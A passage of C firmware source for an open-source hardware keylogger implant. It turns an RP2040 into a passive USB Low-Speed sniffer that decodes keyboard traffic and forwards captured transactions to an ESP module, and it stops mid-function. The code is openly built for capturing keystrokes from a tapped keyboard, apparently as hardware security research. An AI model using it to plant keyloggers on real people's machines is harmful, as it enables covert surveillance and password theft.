/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

/*
  Dreg's note: I have tried to document everything as best as possible and make the code and project
  as accessible as possible for beginners. There may be errors (I am a lazy bastard using COPILOT)
  if you find any, please make a PR
*/

// I'm still a novice with the Pico SDK & RP2040, so please bear with me if there are unnecessary things ;-)

/*
 *
 *  This firmware turns an RP2040 into a passive USB Low-Speed (1.5 Mbit/s)
 *  bus sniffer. It captures the raw USB line, decodes the protocol in software,
 *  and forwards decoded "IN" transactions to a companion ESP over SPI/UART.
 *
 *  It is a Raspberry Pi Pico SDK port of Alex Taradov's "usb-sniffer-lite":
 *      https://github.com/ataradov/usb-sniffer-lite   (BSD-3-Clause)
 *  trimmed to Low Speed only (the speed used by most keyboards and mice).
 *
 *  ---------------------------------------------------------------------------
 *  END-TO-END CAPTURE PIPELINE
 *  ---------------------------------------------------------------------------
 *
 *   USB D+/D- ->  PIO1 (SE0 start sync) --START--> PIO0 (bit sampler)
 *                                                     |
 *                                            RX FIFO  |  raw NRZI line samples
 *                                                     v
 *   [CORE 0, main()]  drains PIO0's FIFO into a double buffer (dbuff1/dbuff2).
 *                     Each captured packet is stored as a stream of DATA words
 *                     plus one trailing SIZE word (see code.pio for the format).
 *                     When a buffer fills, its pointer is handed to core 1 and
 *                     capture continues immediately in the other buffer.
 *                                                     |
 *                              multicore FIFO handoff |
 *                                                     v
 *   [CORE 1, core1_main()]  process_buffer() -> process_packet():
 *                     - NRZI decode (transition = 0, no transition = 1)
 *                     - remove bit stuffing (a 0 forced after six 1s)
 *                     - validate SYNC byte, PID (nibble + complement), CRC5/CRC16
 *                     display_buffer() then formats packets and forwards the
 *                     interesting ones (IN transactions) to the ESP.
 *
 *  The split is deliberate: the PIO does only hard-real-time bit recovery, the
 *  CPU does the heavy protocol decoding, and the two CPU cores pipeline capture
 *  against decoding so no bus traffic is missed.
 *
 *  ---------------------------------------------------------------------------
 *  USB LOW-SPEED PROTOCOL, IN ONE SCREEN
 *  ---------------------------------------------------------------------------
 *  Line states (Low Speed):  J/idle = D- high, D+ low ;  K = D+ high, D- low ;
 *                            SE0 = both low (EOP / bus reset) ; SE1 = both high
 *                            (illegal). NOTE: at Full Speed J/K polarity flips.
 *  Encoding:                 NRZI - a 0 bit is a line transition, a 1 bit is no
 *                            transition. A 0 is stuffed into the stream after any
 *                            six consecutive 1s to guarantee edges for clock
 *                            recovery; the receiver removes it again.
 *  Packet layout on the wire:
 *      SYNC (KJKJKJKK, decodes to 0x80) | PID | [payload] | [CRC] | EOP
 *      - PID byte = 4-bit PID in the low nibble + its one's-complement in the
 *        high nibble (a self-checking field).
 *      - Token/SOF packets carry an 11-bit field guarded by a 5-bit CRC (CRC5).
 *      - DATA packets carry 0..8 payload bytes guarded by a 16-bit CRC (CRC16).
 *      - Handshake packets (ACK/NAK/STALL/NYET) are PID-only, no CRC.
 *  A Low-Speed bus has no SOF packet; instead the host sends a keep-alive EOP
 *  ~every 1 ms, which this code treats as the Low-Speed frame delimiter.
 *
 *  See code.pio for the bit-level capture programs and the FIFO word format.
 * =============================================================================
 */

// This project assumes that copy_to_ram is enabled, so ALL code runs from RAM.
// Running from RAM (rather than execute-in-place from flash) removes flash-wait
// jitter, which matters for the tightly cycle-counted capture loop.

#include "hardware/adc.h"
#include "hardware/clocks.h"
#include "hardware/flash.h"
#include "hardware/irq.h"
#include "hardware/pio.h"
#include "hardware/pll.h"
#include "hardware/regs/io_qspi.h"
#include "hardware/spi.h"
#include "hardware/structs/clocks.h"
#include "hardware/structs/ioqspi.h"
#include "hardware/structs/pll.h"
#include "hardware/structs/sio.h"
#include "hardware/sync.h"
#include "hardware/timer.h"
#include "hardware/uart.h"
#include "hardware/watchdog.h"
#include "okhi.pio.h"
#include "pico/bootrom.h"
#include "pico/multicore.h"
#include "pico/stdlib.h"
#include <stdio.h>
#include <string.h>

#include "../../../../last_firmv.h"

#include "../../com/com.h"

#include "../../com/com_rp.h"

uint32_t __scratch_x("my_group_nameX") fooX = 23;
uint32_t __scratch_y("my_group_nameY") fooY = 23;
#define __core1_func(x) __scratch_y(__STRING(x)) x
#define __core2_func(x) __scratch_x(__STRING(x)) x

// uncomment to enable dev build
// #define DEV_BUILD 1 // NOT USED YET

// for UART debugging on devboard & HW version detection
#define GPIO_A 4
#define GPIO_B 5

#define USSEL_PIN 8
#define USOE_PIN 9

#define BP() __asm("bkpt #1"); // breakpoint via software macro

// ---- USB capture GPIO mapping ----------------------------------------------
// The PIO reads D+, D- and START through a single IN pin base, so these three
// GPIOs MUST be consecutive and in this exact order: the PIO refers to them as
// relative "PIN 0" (D+), "PIN 1" (D-) and "PIN 2" (START). The absolute GPIO
// numbers below can be anything as long as that consecutive DP, DM, START order
// is preserved (see the pin-mapping notes in code.pio).
#define DP_INDEX 20      // D+ data line  -> PIO "PIN 0" (also the low-speed JMP pin)
#define DM_INDEX 21      // D- data line  -> PIO "PIN 1"
#define START_INDEX 22   // PIO1 -> PIO0 START handshake -> PIO "PIN 2"
#define TRIGGER_INDEX 18 // Optional external capture trigger (unused in this build)

#ifndef FLASH_PAGE_SIZE
#define FLASH_PAGE_SIZE 256
#endif
#ifndef FLASH_SECTOR_SIZE
#define FLASH_SECTOR_SIZE 4096
#endif
#define FLASH_TOTAL_SIZE (16 * 1024 * 1024)

#define UART_TO_ESP_BAUD_RATE 74880 // WARNING: Never change this value

#define DATA_BITS 8
#define STOP_BITS 1
#define PARITY UART_PARITY_NONE

#define SPI_BAUD 5000000 // ~4.6 mhz
#define SPI_ID spi1
#define SPI_SCK_PIN 10
#define SPI_MOSI_PIN 11
#define SPI_MISO_PIN 12
#define SPI_CS_PIN 13

#define RP_ADC_GPIO 27 // From PCB v5

#define EBOOT_MASTERDATAREADY_GPIO 14
#define ELOG_SLAVEREADY_GPIO 15
#define ESP_RESET_GPIO 28

/*
Attempting to achieve the minimum necessary delay for the ESP Slave SPI CS signal
-
90 NOP at 125 MHz = 0.72 us. Our SPI runs at ~5 MHz, so 0.72 us is a delay of approximately 3.6 SPI clock cycles.
Overclocking CPU frequency to 250 MHz reduces NOP execution time to 0.36 us,
corresponding to approximately 1.8 SPI clock cycles.
-
https://github.com/espressif/esp-idf/blob/v5.2.2/examples/peripherals/spi_slave/sender/main/app_main.c
spi_device_interface_config_t devcfg = {
...
        .cs_ena_posttrans = 3,
...
Keep the CS low 3 cycles after transaction,
to stop slave from missing the last bit when CS has less propagation delay than CLK
*/
#define delay_cs()                                                                                                     \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t");

#define delay_cs_pre() delay_cs();
#define delay_cs_pos() delay_cs();
#define CS_LOW()                                                                                                       \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");                                                  \
    gpio_put(SPI_CS_PIN, false);                                                                                       \
    delay_cs_pre();
#define CS_HIGH()                                                                                                      \
    delay_cs_pos();                                                                                                    \
    gpio_put(SPI_CS_PIN, true);                                                                                        \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");

#define BUFFER_SIZE ((232 * 1024) / (int)sizeof(uint32_t))

// ---- Per-packet header flags -----------------------------------------------
// After a packet has been decoded, process_packet() overwrites its header word
// (g_buffer[packet]) with a combined value:  [status/error flags] | [byte size].
// The high bits below are the flags; the low 16 bits (CAPTURE_SIZE_MASK) hold
// the decoded packet length in bytes. This lets the display stage tell at a
// glance whether a packet was clean, malformed, a bus reset, etc.
#define CAPTURE_ERROR_STUFF (1 << 31) // Bit-stuffing violation: a 7th consecutive 1
#define CAPTURE_ERROR_CRC (1 << 30)   // CRC5/CRC16 check failed
#define CAPTURE_ERROR_PID (1 << 29)   // PID nibble != complement of check nibble
#define CAPTURE_ERROR_SYNC (1 << 28)  // First decoded byte was not a valid SYNC
#define CAPTURE_ERROR_NBIT (1 << 27)  // Packet did not end on a whole-byte boundary
#define CAPTURE_ERROR_SIZE (1 << 26)  // Packet too short / wrong length for its PID
#define CAPTURE_RESET (1 << 25)       // Bus reset (sustained SE0, bit count 0)
#define CAPTURE_LS_SOF (1 << 24)      // Low-Speed keep-alive, used as the LS frame mark
#define CAPTURE_MAY_FOLD (1 << 23)    // Frame is "empty" (only IN/NAK) -> foldable in display

// Any of these bits set means the packet had a detectable error.
#define CAPTURE_ERROR_MASK                                                                                             \
    (CAPTURE_ERROR_STUFF | CAPTURE_ERROR_CRC | CAPTURE_ERROR_PID | CAPTURE_ERROR_SYNC | CAPTURE_ERROR_NBIT |           \
     CAPTURE_ERROR_SIZE)

#define CAPTURE_SIZE_MASK 0xffff // Low 16 bits of the header word = decoded byte count

#define ERROR_DATA_SIZE_LIMIT 16 // Max payload bytes to dump when printing an errored packet
#define MAX_PACKET_DELTA 10000   // us; a larger gap between packets is treated as buffer corruption

#define RING_BUFF_MAX_ENTRIES 800

typedef enum
{
    VERSION_00 = 0,
    VERSION_01,
    VERSION_10,
    VERSION_11,
    VERSION_FF,
    VERSION_0F,
    VERSION_1F,
    VERSION_F0,
    VERSION_F1,
    VERSION_UNKNOWN
} hw_version_t;

typedef enum
{
    PIN_STATE_LOW = 0,
    PIN_STATE_HIGH,
    PIN_STATE_FLOATING
} pin_state_t;

// ---- USB Packet IDs (PIDs) --------------------------------------------------
// The byte after SYNC is the PID byte: the low nibble is the 4-bit PID, and the
// high nibble is its bitwise complement (a built-in check). The values below are
// the 4-bit PID codes. The two lowest bits classify the packet group
// (token/data/handshake/special), which is why they are grouped here.
enum
{
    Pid_Reserved = 0, // 0x0 - illegal / never used

    // Token packets: address a device+endpoint, or (SOF) carry a frame number.
    Pid_Out = 1,    // 0x1 - host->device data transfer follows
    Pid_In = 9,     // 0x9 - device->host data transfer follows
    Pid_Sof = 5,    // 0x5 - Start-Of-Frame (Full Speed only; LS uses keep-alives)
    Pid_Setup = 13, // 0xD - begins a control transfer

    // Data packets: carry the payload, guarded by CRC16.
    Pid_Data0 = 3,  // 0x3 - even data toggle
    Pid_Data1 = 11, // 0xB - odd data toggle
    Pid_Data2 = 7,  // 0x7 - high-speed isochronous only
    Pid_MData = 15, // 0xF - high-speed isochronous only

    // Handshake packets: PID-only, no payload and no CRC.
    Pid_Ack = 2,    // 0x2 - received OK
    Pid_Nak = 10,   // 0xA - not ready / no data (device asks host to retry)
    Pid_Stall = 14, // 0xE - endpoint halted / request unsupported
    Pid_Nyet = 6,   // 0x6 - not yet (USB 2.0 high-speed flow control)

    // Special packets.
    Pid_PreErr = 12, // 0xC - PRE (low-speed preamble) / ERR (split error); same code
    Pid_Split = 8,   // 0x8 - high-speed split transaction (5-byte token)
    Pid_Ping = 4,    // 0x4 - high-speed PING
};

enum
{
    CaptureSpeed_Low,
    CaptureSpeed_Full,
    CaptureSpeedCount,
};

enum
{
    CaptureTrigger_Enabled,
    CaptureTrigger_Disabled,
    CaptureTriggerCount,
};

enum
{
    CaptureLimit_100,
    CaptureLimit_200,
    CaptureLimit_500,
    CaptureLimit_1000,
    CaptureLimit_2000,
    CaptureLimit_5000,
    CaptureLimit_10000,
    CaptureLimit_Unlimited,
    CaptureLimitCount,
};

enum
{
    DisplayTime_First,
    DisplayTime_Previous,
    DisplayTime_SOF,
    DisplayTime_Reset,
    DisplayTimeCount,
};

enum
{
    DisplayData_None,
    DisplayData_Limit16,
    DisplayData_Limit64,
    DisplayData_Full,
    DisplayDataCount,
};

enum
{
    DisplayFold_Enabled,
    DisplayFold_Disabled,
    DisplayFoldCount,
};

// Metadata describing one capture buffer's contents.
typedef struct
{
    bool fs;      // true = Full Speed capture, false = Low Speed. Stays false in
                  // this LS-only build, which flips the decode paths to LS rules.
    bool trigger; // reserved for the external trigger feature (unused here)
    int limit;    // stop after this many packets (see capture_limit_value())
    int count;    // number of packets currently stored in this buffer
    int errors;   // packets flagged with any CAPTURE_ERROR_* bit
    int resets;   // bus resets seen
    int frames;   // frames seen (one per SOF / LS keep-alive)
    int folded;   // "empty" frames collapsed by the folding logic
} buffer_info_t;

// One capture buffer. g_buffer serves double duty: core 0 fills it with RAW
// captured words (DATA words + trailing SIZE words) during capture; core 1 then
// decodes and COMPACTS it in place (decoded output is always shorter than the
// raw input, so process_buffer() can read ahead and write behind in the same
// array). Two of these (dbuff1/dbuff2) are used as a ping-pong double buffer.
typedef struct
{
    uint32_t g_buffer[16000];
    buffer_info_t g_buffer_info;
} dbuff_t;

extern char __flash_binary_end;

volatile static unsigned int write_index = 0;
volatile static char ringbuff[RING_BUFF_MAX_ENTRIES][32];

static volatile unsigned int total_packets_sended = 0;

static volatile char *hwver_name = "UNKNOWN";
static volatile hw_version_t hwver = VERSION_UNKNOWN;

// The ping-pong double buffer. While core 0 captures into curr_dbuff, core 1
// decodes/displays last_dbuff; then the two roles swap.
static volatile dbuff_t dbuff1;
static volatile dbuff_t dbuff2;

static volatile dbuff_t *last_dbuff = NULL; // buffer being decoded/displayed (core 1)
static volatile dbuff_t *curr_dbuff = NULL; // buffer being captured into (core 0)

// User-facing capture/display options (defaults). Note: this LS-only build keeps
// fs=false regardless of g_capture_speed, and capture_limit_value() currently
// forces the limit to 5000 packets.
static volatile int g_capture_speed = CaptureSpeed_Full;
static volatile int g_capture_trigger = CaptureTrigger_Disabled;
static volatile int g_capture_limit = CaptureLimit_Unlimited;
static volatile int g_display_time = DisplayTime_SOF;     // what timestamps are relative to
static volatile int g_display_data = DisplayData_Full;    // how much payload to print
static volatile int g_display_fold = DisplayFold_Enabled; // collapse idle frames or not

// Decode cursors used by process_buffer()/process_packet(). Because decoding
// compacts the buffer in place, the read cursor stays ahead of the write cursor.
static volatile int g_rd_ptr = 0;        // read cursor into raw captured words
static volatile int g_wr_ptr = 0;        // write cursor for decoded output
static volatile int g_sof_index = 0;     // header index of the current frame's SOF
static volatile bool g_may_fold = false; // is the current frame still "empty" (foldable)?

// Display-time bookkeeping (timing reference and fold run state).
static volatile uint32_t g_ref_time;  // time origin the printed deltas are measured from
static volatile uint32_t g_prev_time; // previous packet's time (for delta / corruption check)
static volatile bool g_check_delta;   // whether to sanity-check the inter-packet delta
static volatile bool g_folding;       // currently inside a folded run of empty frames
static volatile int g_fold_count;     // how many frames have been folded so far
static volatile int g_display_ptr;    // cursor used while walking packets for display

// Byte-wise lookup table for the USB data CRC-16 (polynomial x^16+x^15+x^2+1,
// reflected form 0xA001). Used by crc16_usb() to check DATA0/DATA1/DATA2/MDATA
// packets. A correct packet leaves the residual 0xB001.
static const uint16_t crc16_usb_tab[256] = {
    0x0000, 0xc0c1, 0xc181, 0x0140, 0xc301, 0x03c0, 0x0280, 0xc241, 0xc601, 0x06c0, 0x0780, 0xc741, 0x0500, 0xc5c1,
    0xc481, 0x0440, 0xcc01, 0x0cc0, 0x0d80, 0xcd41, 0x0f00, 0xcfc1, 0xce81, 0x0e40, 0x0a00, 0xcac1, 0xcb81, 0x0b40,
    0xc901, 0x09c0, 0x0880, 0xc841, 0xd801, 0x18c0, 0x1980, 0xd941, 0x1b00, 0xdbc1, 0xda81, 0x1a40, 0x1e00, 0xdec1,
    0xdf81, 0x1f40, 0xdd01, 0x1dc0, 0x1c80, 0xdc41, 0x1400, 0xd4c1, 0xd581, 0x1540, 0xd701, 0x17c0, 0x1680, 0xd641,
    0xd201, 0x12c0, 0x1380, 0xd341, 0x1100, 0xd1c1, 0xd081, 0x1040, 0xf001, 0x30c0, 0x3180, 0xf141, 0x3300, 0xf3c1,
    0xf281, 0x3240, 0x3600, 0xf6c1, 0xf781, 0x3740, 0xf501, 0x35c0, 0x3480, 0xf441, 0x3c00, 0xfcc1, 0xfd81, 0x3d40,
    0xff01, 0x3fc0, 0x3e80, 0xfe41, 0xfa01, 0x3ac0, 0x3b80, 0xfb41, 0x3900, 0xf9c1, 0xf881, 0x3840, 0x2800, 0xe8c1,
    0xe981, 0x2940, 0xeb01, 0x2bc0, 0x2a80, 0xea41, 0xee01, 0x2ec0, 0x2f80, 0xef41, 0x2d00, 0xedc1, 0xec81, 0x2c40,
    0xe401, 0x24c0, 0x2580, 0xe541, 0x2700, 0xe7c1, 0xe681, 0x2640, 0x2200, 0xe2c1, 0xe381, 0x2340, 0xe101, 0x21c0,
    0x2080, 0xe041, 0xa001, 0x60c0, 0x6180, 0xa141, 0x6300, 0xa3c1, 0xa281, 0x6240, 0x6600, 0xa6c1, 0xa781, 0x6740,
    0xa501, 0x65c0, 0x6480, 0xa441, 0x6c00, 0xacc1, 0xad81, 0x6d40, 0xaf01, 0x6fc0, 0x6e80, 0xae41, 0xaa01, 0x6ac0,
    0x6b80, 0xab41, 0x6900, 0xa9c1, 0xa881, 0x6840, 0x7800, 0xb8c1, 0xb981, 0x7940, 0xbb01, 0x7bc0, 0x7a80, 0xba41,
    0xbe01, 0x7ec0, 0x7f80, 0xbf41, 0x7d00, 0xbdc1, 0xbc81, 0x7c40, 0xb401, 0x74c0, 0x7580, 0xb541, 0x7700, 0xb7c1,
    0xb681, 0x7640, 0x7200, 0xb2c1, 0xb381, 0x7340, 0xb101, 0x71c0, 0x7080, 0xb041, 0x5000, 0x90c1, 0x9181, 0x5140,
    0x9301, 0x53c0, 0x5280, 0x9241, 0x9601, 0x56c0, 0x5780, 0x9741, 0x5500, 0x95c1, 0x9481, 0x5440, 0x9c01, 0x5cc0,
    0x5d80, 0x9d41, 0x5f00, 0x9fc1, 0x9e81, 0x5e40, 0x5a00, 0x9ac1, 0x9b81, 0x5b40, 0x9901, 0x59c0, 0x5880, 0x9841,
    0x8801, 0x48c0, 0x4980, 0x8941, 0x4b00, 0x8bc1, 0x8a81, 0x4a40, 0x4e00, 0x8ec1, 0x8f81, 0x4f40, 0x8d01, 0x4dc0,
    0x4c80, 0x8c41, 0x4400, 0x84c1, 0x8581, 0x4540, 0x8701, 0x47c0, 0x4680, 0x8641, 0x8201, 0x42c0, 0x4380, 0x8341,
    0x4100, 0x81c1, 0x8081, 0x4040,
};

// Byte-wise lookup table for the USB token CRC-5 (polynomial x^5+x^2+1). Used by
// crc5_usb() to check IN/OUT/SETUP/SOF/PING/SPLIT tokens. A correct token leaves
// the residual 0x09.
static const uint8_t crc5_usb_tab[256] = {
    0x00, 0x0e, 0x1c, 0x12, 0x11, 0x1f, 0x0d, 0x03, 0x0b, 0x05, 0x17, 0x19, 0x1a, 0x14, 0x06, 0x08, 0x16, 0x18, 0x0a,
    0x04, 0x07, 0x09, 0x1b, 0x15, 0x1d, 0x13, 0x01, 0x0f, 0x0c, 0x02, 0x10, 0x1e, 0x05, 0x0b, 0x19, 0x17, 0x14, 0x1a,
    0x08, 0x06, 0x0e, 0x00, 0x12, 0x1c, 0x1f, 0x11, 0x03, 0x0d, 0x13, 0x1d, 0x0f, 0x01, 0x02, 0x0c, 0x1e, 0x10, 0x18,
    0x16, 0x04, 0x0a, 0x09, 0x07, 0x15, 0x1b, 0x0a, 0x04, 0x16, 0x18, 0x1b, 0x15, 0x07, 0x09, 0x01, 0x0f, 0x1d, 0x13,
    0x10, 0x1e, 0x0c, 0x02, 0x1c, 0x12, 0x00, 0x0e, 0x0d, 0x03, 0x11, 0x1f, 0x17, 0x19, 0x0b, 0x05, 0x06, 0x08, 0x1a,
    0x14, 0x0f, 0x01, 0x13, 0x1d, 0x1e, 0x10, 0x02, 0x0c, 0x04, 0x0a, 0x18, 0x16, 0x15, 0x1b, 0x09, 0x07, 0x19, 0x17,
    0x05, 0x0b, 0x08, 0x06, 0x14, 0x1a, 0x12, 0x1c, 0x0e, 0x00, 0x03, 0x0d, 0x1f, 0x11, 0x14, 0x1a, 0x08, 0x06, 0x05,
    0x0b, 0x19, 0x17, 0x1f, 0x11, 0x03, 0x0d, 0x0e, 0x00, 0x12, 0x1c, 0x02, 0x0c, 0x1e, 0x10, 0x13, 0x1d, 0x0f, 0x01,
    0x09, 0x07, 0x15, 0x1b, 0x18, 0x16, 0x04, 0x0a, 0x11, 0x1f, 0x0d, 0x03, 0x00, 0x0e, 0x1c, 0x12, 0x1a, 0x14, 0x06,
    0x08, 0x0b, 0x05, 0x17, 0x19, 0x07, 0x09, 0x1b, 0x15, 0x16, 0x18, 0x0a, 0x04, 0x0c, 0x02, 0x10, 0x1e, 0x1d, 0x13,
    0x01, 0x0f, 0x1e, 0x10, 0x02, 0x0c, 0x0f, 0x01, 0x13, 0x1d, 0x15, 0x1b, 0x09, 0x07, 0x04, 0x0a, 0x18, 0x16, 0x08,
    0x06, 0x14, 0x1a, 0x19, 0x17, 0x05, 0x0b, 0x03, 0x0d, 0x1f, 0x11, 0x12, 0x1c, 0x0e, 0x00, 0x1b, 0x15, 0x07, 0x09,
    0x0a, 0x04, 0x16, 0x18, 0x10, 0x1e, 0x0c, 0x02, 0x01, 0x0f, 0x1d, 0x13, 0x0d, 0x03, 0x11, 0x1f, 0x1c, 0x12, 0x00,
    0x0e, 0x06, 0x08, 0x1a, 0x14, 0x17, 0x19, 0x0b, 0x05,
};

static const char *capture_speed_str[CaptureSpeedCount] = {
    [CaptureSpeed_Low] = "Low",
    [CaptureSpeed_Full] = "Full",
};

static const char *capture_trigger_str[CaptureTriggerCount] = {
    [CaptureTrigger_Enabled] = "Enabled",
    [CaptureTrigger_Disabled] = "Disabled",
};

static const char *capture_limit_str[CaptureLimitCount] = {
    [CaptureLimit_100] = "100 packets",     [CaptureLimit_200] = "200 packets",
    [CaptureLimit_500] = "500 packets",     [CaptureLimit_1000] = "1000 packets",
    [CaptureLimit_2000] = "2000 packets",   [CaptureLimit_5000] = "5000 packets",
    [CaptureLimit_10000] = "10000 packets", [CaptureLimit_Unlimited] = "Unlimited",
};

static const char *display_time_str[DisplayTimeCount] = {
    [DisplayTime_First] = "Relative to the first packet",
    [DisplayTime_Previous] = "Relative to the previous packet",
    [DisplayTime_SOF] = "Relative to the SOF",
    [DisplayTime_Reset] = "Relative to the bus reset",
};

static const char *display_data_str[DisplayDataCount] = {
    [DisplayData_Full] = "Full",
    [DisplayData_Limit16] = "Limit to 16 bytes",
    [DisplayData_Limit64] = "Limit to 64 bytes",
    [DisplayData_None] = "Do not display data",
};

static const char *display_fold_str[DisplayFoldCount] = {
    [DisplayFold_Enabled] = "Enabled",
    [DisplayFold_Disabled] = "Disabled",
};

static pin_state_t get_pin_state(uint gpio)
{
    gpio_init(gpio);
    gpio_pull_up(gpio);
    sleep_ms(5);
    bool pull_up_state = gpio_get(gpio);

    gpio_pull_down(gpio);
    sleep_ms(5);
    bool pull_down_state = gpio_get(gpio);

    gpio_deinit(gpio);

    if (pull_up_state && !pull_down_state)
    {
        return PIN_STATE_FLOATING;
    }

    return pull_up_state ? PIN_STATE_HIGH : PIN_STATE_LOW;
}

static hw_version_t detect_hw_version(void)
{
    pin_state_t state_a = get_pin_state(GPIO_A);
    pin_state_t state_b = get_pin_state(GPIO_B);

    if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_FLOATING)
    {
        return VERSION_FF;
    }
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_FLOATING)
    {
        return VERSION_0F;
    }
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_FLOATING)
    {
        return VERSION_1F;
    }
    else if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_LOW)
    {
        return VERSION_F0;
    }
    else if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_HIGH)
    {
        return VERSION_F1;
    }
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_LOW)
    {
        return VERSION_00;
    }
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_HIGH)
    {
        return VERSION_01;
    }
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_LOW)
    {
        return VERSION_10;
    }
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_HIGH)
    {
        return VERSION_11;
    }
    else
    {
        return VERSION_UNKNOWN;
    }
}

static int init_ver(void)
{
    hwver = detect_hw_version();

    switch (hwver)
    {
        case VERSION_00:
            hwver_name = "00";
            printf("Hardware version: 00\n");
            break;

        case VERSION_01:
            hwver_name = "01";
            printf("Hardware version: 01\n");
            break;

        case VERSION_10:
            hwver_name = "10";
            printf("Hardware version: 10\n");
            break;

        case VERSION_11:
            hwver_name = "11";
            printf("Hardware version: 11\n");
            break;

        case VERSION_FF:
            hwver_name = "FF";
            printf("Hardware version: FF (both floating)\n");
            break;

        case VERSION_0F:
            hwver_name = "0F";
            printf("Hardware version: 0F (A low, B floating)\n");
            break;

        case VERSION_1F:
            hwver_name = "1F";
            printf("Hardware version: 1F (A high, B floating)\n");
            break;

        case VERSION_F0:
            hwver_name = "F0";
            printf("Hardware version: F0 (A floating, B low)\n");
            break;

        case VERSION_F1:
            hwver_name = "F1";
            printf("Hardware version: F1 (A floating, B high)\n");
            break;

        default:
            hwver_name = "UK";
            printf("Hardware version: Unknown\n");
            break;
    }

    return 0;
}

static int my_spi_write_blocking(const uint8_t *src, size_t len)
{
    CS_LOW();
    int retf = spi_write_blocking(SPI_ID, src, len);
    CS_HIGH();

    return retf;
}

static int my_spi_to_esp_write_blocking(const uint8_t *src, size_t len)
{
    gpio_put(EBOOT_MASTERDATAREADY_GPIO, true);
    while (!gpio_get(ELOG_SLAVEREADY_GPIO))
    {
        tight_loop_contents();
    }
    gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
    return my_spi_write_blocking(src, len);
}

static int my_spi_read_blocking(uint8_t *dst, size_t len)
{
    CS_LOW();
    // repeated_tx_data is output repeatedly on TX as data is read in from RX. Generally this can be 0
    int retf = spi_read_blocking(SPI_ID, 0, dst, len);
    CS_HIGH();

    return retf;
}

static int my_spi_write_read_blocking(const uint8_t *src, uint8_t *dst, size_t len)
{
    CS_LOW();
    int retf = spi_write_read_blocking(SPI_ID, src, dst, len);
    CS_HIGH();

    return retf;
}

static unsigned char *get_base_flash_space_addr(void)
{
    return (unsigned char *)XIP_BASE;
}

static uint32_t get_start_free_flash_space_addr(void)
{
    return ((((uint32_t)XIP_BASE) + ((uint32_t)__flash_binary_end) + (FLASH_PAGE_SIZE - 1)) & ~(FLASH_PAGE_SIZE - 1));
}

static uint32_t get_flash_end_address(void)
{
    return ((((((uint32_t)XIP_BASE)) + (PICO_FLASH_SIZE_BYTES - 1)) + (FLASH_PAGE_SIZE - 1)) & ~(FLASH_PAGE_SIZE - 1));
}

static uint32_t get_free_flash_space(void)
{
    return get_flash_end_address() - get_start_free_flash_space_addr();
}

static void erase_flash(void)
{
    flash_range_erase(0, PICO_FLASH_SIZE_BYTES);
    reset_usb_boot(0, 0);
}

__attribute__((section(".uninitialized_data"))) uint32_t wait_20;

void gpio_callback(uint gpio, uint32_t events)
{
    // For devboard :D
    if (gpio == ESP_RESET_GPIO)
    {
        gpio_init(ESP_RESET_GPIO);
        gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
        gpio_init(EBOOT_MASTERDATAREADY_GPIO);
        gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_IN);
        gpio_init(ELOG_SLAVEREADY_GPIO);
        gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);

        wait_20 = 0x69699696;
        puts("\r\nexternal ESP-RESET detected!\r\nrebooting in 50 secs!!!\r\n");
        watchdog_reboot(0, 0, 0);
    }
}

// How many packets to capture before handing the buffer to core 1. This build
// hard-codes 5000 (the early return); the g_capture_limit switch below is the
// original configurable path, kept for reference but currently unreachable.
static int capture_limit_value(void)
{
    return 5000;

